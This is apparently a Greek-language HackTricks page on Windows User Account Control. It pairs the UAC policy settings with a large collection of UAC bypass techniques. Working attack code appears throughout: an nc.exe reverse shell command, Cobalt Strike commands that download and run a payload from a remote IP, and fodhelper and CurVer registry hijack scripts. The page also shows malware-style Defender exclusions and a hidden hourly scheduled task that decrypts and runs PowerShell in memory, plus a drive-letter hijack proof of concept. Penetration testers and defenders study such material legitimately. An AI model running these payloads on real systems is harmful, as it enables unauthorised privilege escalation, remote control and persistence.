# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί ένα **πρόσκληση συγκατάθεσης για αναβαθμισμένες ενέργειες**. Οι εφαρμογές έχουν διαφορετικά `integrity` levels, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελέσει εργασίες που **θα μπορούσαν ενδεχομένως να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργό, οι εφαρμογές και οι εργασίες πάντα **εκτελούνται στο πλαίσιο ασφαλείας ενός λογαριασμού μη διαχειριστή** εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση επιπέδου διαχειριστή για εκτέλεση. Είναι μια λειτουργία ευκολίας που προστατεύει τους διαχειριστές από ανεπιθύμητες αλλαγές αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργό, σε έναν χρήστη διαχειριστή δίνονται 2 tokens: ένα token τυπικού χρήστη για την εκτέλεση κανονικών ενεργειών σε επίπεδο χρήστη, και ένα token με προνόμια διαχειριστή.

Αυτή η [σελίδα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) περιγράφει εκτενώς πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία εισόδου (logon), την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν security policies για να διαμορφώσουν πώς λειτουργεί το UAC ειδικά για τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας secpol.msc), ή να το ρυθμίσουν και να το προωθήσουν μέσω Group Policy Objects (GPO) σε περιβάλλον τομέα Active Directory. Οι διάφορες ρυθμίσεις αναλύονται λεπτομερώς [εδώ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Ρύθμιση Group Policy                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Προεπιλεγμένη ρύθμιση                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Ζητά συγκατάθεση για μη-Windows εκτελέσιμα στο secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Ζητά διαπιστευτήρια στο secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ενεργοποιημένο; απενεργοποιημένο κατά προεπιλογή σε Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Απενεργοποιημένο)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ενεργοποιημένο)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ενεργοποιημένο)                                              |

### Policies for installing software on Windows

Οι **local security policies** ("secpol.msc" στις περισσότερες εγκαταστάσεις) είναι ρυθμισμένες από προεπιλογή ώστε να **αποτρέπουν τους μη-admin χρήστες από την εγκατάσταση λογισμικού**. Αυτό σημαίνει ότι ακόμη κι αν ένας μη-admin χρήστης κατεβάσει τον εγκαταστάτη για κάποιο λογισμικό, δεν θα μπορεί να τον εκτελέσει χωρίς λογαριασμό admin.

### Registry Keys to Force UAC to Ask for Elevation

Ως τυπικός χρήστης χωρίς δικαιώματα admin, μπορείτε να διασφαλίσετε ότι ο "standard" λογαριασμός **θα του ζητάει διαπιστευτήρια από το UAC** όταν επιχειρεί να εκτελέσει συγκεκριμένες ενέργειες. Αυτή η ενέργεια θα απαιτήσει την τροποποίηση ορισμένων **registry keys**, για τα οποία χρειάζεστε δικαιώματα admin, εκτός αν υπάρχει κάποιος **UAC bypass**, ή ο επιτιθέμενος είναι ήδη συνδεδεμένος ως admin.

Ακόμα και αν ο χρήστης ανήκει στην ομάδα **Administrators**, αυτές οι αλλαγές αναγκάζουν τον χρήστη να **εισάγει ξανά τα διαπιστευτήριά του** για να εκτελέσει ενέργειες διαχειριστή.

**Το μόνο μειονέκτημα είναι ότι αυτή η προσέγγιση απαιτεί το UAC να είναι απενεργοποιημένο για να λειτουργήσει, κάτι που είναι απίθανο σε παραγωγικά περιβάλλοντα.**

Τα registry keys και οι καταχωρήσεις που πρέπει να αλλάξετε είναι οι ακόλουθες (με τις προεπιλεγμένες τιμές σε παρένθεση):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Αυτό μπορεί επίσης να γίνει χειροκίνητα μέσω του εργαλείου Local Security Policy. Αφού αλλάξουν, οι διαχειριστικές ενέργειες ζητούν από τον χρήστη να εισάγει ξανά τα διαπιστευτήριά του.

### Note

**User Account Control is not a security boundary.** Επομένως, οι τυπικοί χρήστες δεν μπορούν να ξεφύγουν από τους λογαριασμούς τους και να αποκτήσουν δικαιώματα διαχειριστή χωρίς κάποιο exploit τοπικής άυξησης προνομίων.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Δικαιώματα

- Internet Explorer Protected Mode χρησιμοποιεί ελέγχους ακεραιότητας για να αποτρέπει διεργασίες υψηλού επιπέδου ακεραιότητας (όπως web browsers) από την πρόσβαση σε δεδομένα χαμηλού επιπέδου ακεραιότητας (όπως ο φάκελος προσωρινών αρχείων Internet). Αυτό γίνεται εκτελώντας τον browser με token χαμηλής ακεραιότητας. Όταν ο browser προσπαθεί να προσπελάσει δεδομένα που αποθηκεύονται στη ζώνη χαμηλής ακεραιότητας, το λειτουργικό ελέγχει το επίπεδο ακεραιότητας της διεργασίας και επιτρέπει την πρόσβαση ανάλογα. Αυτή η λειτουργία βοηθά στην αποτροπή επιθέσεων remote code execution από το να αποκτήσουν πρόσβαση σε ευαίσθητα δεδομένα στο σύστημα.
- Όταν ένας χρήστης συνδέεται στα Windows, το σύστημα δημιουργεί ένα access token που περιέχει μια λίστα με τα privileges του χρήστη. Τα privileges ορίζονται ως ο συνδυασμός των δικαιωμάτων και των ικανοτήτων ενός χρήστη. Το token περιέχει επίσης μια λίστα με τα credentials του χρήστη, τα οποία χρησιμοποιούνται για να authenticate τον χρήστη στον υπολογιστή και στους πόρους του δικτύου.

### Autoadminlogon

Για να ρυθμίσετε τα Windows ώστε να γίνεται αυτόματη σύνδεση με έναν συγκεκριμένο χρήστη κατά την εκκίνηση, ορίστε το **`AutoAdminLogon` registry key**. Αυτό είναι χρήσιμο για kiosk environments ή για testing. Χρησιμοποιήστε το μόνο σε ασφαλή συστήματα, καθώς εκθέτει το password στο registry.

Ορίστε τα ακόλουθα κλειδιά χρησιμοποιώντας τον Registry Editor ή `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Για να επαναφέρετε την κανονική συμπεριφορά σύνδεσης, ορίστε `AutoAdminLogon` σε 0.

## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, το UAC bypass είναι απλό καθώς μπορείτε απλά να κάνετε κλικ στο "Ναι" όταν εμφανιστεί το UAC prompt

Το UAC bypass χρειάζεται στην εξής περίπτωση: **το UAC είναι ενεργοποιημένο, η διεργασία σας τρέχει σε context μέσης ακεραιότητας (medium integrity), και ο χρήστης σας ανήκει στην ομάδα administrators**.

Είναι σημαντικό να αναφερθεί ότι είναι **πολύ πιο δύσκολο να παρακάμψετε το UAC αν βρίσκεται στο υψηλότερο επίπεδο ασφάλειας (Always) παρά σε κάποιο από τα άλλα επίπεδα (Default).**

### UAC disabled

Αν το UAC είναι ήδη απενεργοποιημένο (`ConsentPromptBehaviorAdmin` είναι **`0`**) μπορείτε να **εκτελέσετε ένα reverse shell με admin privileges** (high integrity level) χρησιμοποιώντας κάτι σαν:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασικό UAC "bypass" (πλήρης πρόσβαση στο file system)

Αν έχετε ένα shell με έναν χρήστη που είναι μέλος της ομάδας Administrators μπορείτε να **mount the C$** shared via SMB (file system) τοπικά ως νέος δίσκος και θα έχετε **πρόσβαση σε όλα όσα υπάρχουν στο file system** (ακόμη και το Administrator home folder).

> [!WARNING]
> **Φαίνεται ότι αυτό το κόλπο δεν δουλεύει πια**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass με cobalt strike

Οι τεχνικές Cobalt Strike θα λειτουργήσουν μόνο εάν το UAC δεν έχει οριστεί στο μέγιστο επίπεδο ασφάλειας.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** έχουν επίσης αρκετά modules για **bypass** το **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) το οποίο είναι μια **συλλογή** από διάφορα UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME using visual studio or msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`) , θα πρέπει να ξέρετε **ποιο χρειάζεστε.**\
Θα πρέπει **να είστε προσεκτικοί** γιατί κάποιοι bypasses θα **προκαλέσουν την εκκίνηση άλλων προγραμμάτων** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME περιλαμβάνει την **έκδοση build από την οποία κάθε τεχνική άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [this](https://en.wikipedia.org/wiki/Windows_10_version_history) σελίδα λαμβάνετε την έκδοση Windows `1607` από τους αριθμούς build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το αξιόπιστο δυαδικό `fodhelper.exe` ανυψώνεται αυτόματα στα σύγχρονα Windows. Όταν εκκινείται, ελέγχει την παρακάτω διαδρομή μητρώου ανά χρήστη χωρίς να επικυρώνει το verb `DelegateExecute`. Η τοποθέτηση μιας εντολής εκεί επιτρέπει σε μια διαδικασία Medium Integrity (ο χρήστης είναι μέλος των Administrators) να εκκινήσει μια διαδικασία High Integrity χωρίς προτροπή UAC.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Βήματα PowerShell (ορίστε το payload σας, μετά ενεργοποιήστε)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος της ομάδας Administrators και το επίπεδο UAC είναι default/lenient (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να εκκινήσετε ένα 64-bit PowerShell από μια 32-bit διαδικασία σε 64-bit Windows.
- Το payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd ή διαδρομή EXE). Αποφύγετε UI που εμφανίζουν προτροπές, για stealth.

#### CurVer/extension hijack variant (HKCU only)

Πρόσφατα δείγματα που εκμεταλλεύονται το `fodhelper.exe` παρακάμπτουν το `DelegateExecute` και αντ' αυτού **ανακατευθύνουν το `ms-settings` ProgID** μέσω της per-user τιμής `CurVer`. Το auto-elevated binary εξακολουθεί να επιλύει τον handler κάτω από `HKCU`, οπότε δεν απαιτείται admin token για να τοποθετηθούν τα κλειδιά:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Μόλις αποκτήσει αυξημένα δικαιώματα, το malware συνήθως **απενεργοποιεί τις μελλοντικές προτροπές** ρυθμίζοντας `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` σε `0`, στη συνέχεια εκτελεί επιπλέον defense evasion (π.χ., `Add-MpPreference -ExclusionPath C:\ProgramData`) και επαναδημιουργεί persistence για να τρέξει ως high integrity. Μια τυπική persistence task αποθηκεύει ένα **XOR-encrypted PowerShell script** στο δίσκο και το αποκωδικοποιεί/εκτελεί στη μνήμη κάθε ώρα:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.

#### Περισσότερες παρακάμψεις UAC

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για να bypass το AUC **απαιτούν** ένα **πλήρες interactive shell** με το θύμα (ένα κοινό nc.exe shell δεν αρκεί).

Μπορείτε να το αποκτήσετε χρησιμοποιώντας μια **meterpreter** session. Μεταφέρετε (migrate) σε μια **process** που έχει την τιμή **Session** ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### Παράκαμψη UAC με GUI

Αν έχετε πρόσβαση σε μια **GUI μπορείτε απλά να αποδεχτείτε το UAC prompt** όταν εμφανιστεί, δεν χρειάζεστε πραγματικά ένα bypass. Άρα, η πρόσβαση σε GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια GUI session που κάποιος χρησιμοποιούσε (πιθανώς μέσω RDP) υπάρχουν **κάποια tools που θα τρέχουν ως administrator** από όπου θα μπορούσατε **να τρέξετε** ένα **cmd** για παράδειγμα **ως admin** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι λίγο πιο **stealthy**.

### Θορυβώδης brute-force UAC bypass

Αν δεν σας νοιάζει να είστε θορυβώδεις, μπορείτε πάντα να **τρέξετε κάτι σαν** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να ανυψώσει τα permissions μέχρι ο χρήστης να τα αποδεχτεί**.

### Η δική σας παράκαμψη - Βασική μεθοδολογία παράκαμψης UAC

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι **οι περισσότερες παρακάμψεις UAC εκμεταλλεύονται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα **autoelevate** (ελέγξτε ότι όταν εκτελείται τρέχει σε υψηλό integrity level).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε κάποια **protected paths** (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7,8 and 8.1. Επιτρέπει την εξαγωγή του περιεχομένου ενός CAB αρχείου μέσα σε protected paths (επειδή αυτό το εργαλείο εκτελείται από υψηλό integrity level).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL σας μέσα στο protected path και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Άλλη τεχνική παράκαμψης UAC

Συνίσταται στο να παρακολουθείτε αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **name/path** ενός **binary** ή **command** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτή την πληροφορία μέσα στο **HKCU**).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. Από μια low-privileged session, καλέστε `RAiProcessRunOnce` για να spawn ένα promptless shadow-admin `runonce.exe`.
2. Duplicate το primary token του σε ένα **identification** token και κάντε impersonate ενώ ανοίγετε το `\??` για να αναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` υπό attacker ownership.
3. Δημιουργήστε ένα `C:` symlink εκεί που δείχνει σε attacker-controlled storage; οι επόμενες filesystem accesses σε αυτή τη session επιλύουν το `C:` στην attacker διαδρομή, επιτρέποντας DLL/file hijack χωρίς prompt.

PowerShell PoC (NtObjectManager):
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές
- [HTB: Rainbow – SEH overflow προς RCE μέσω HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – συλλογή τεχνικών UAC bypass](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – drive-letter hijack του Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
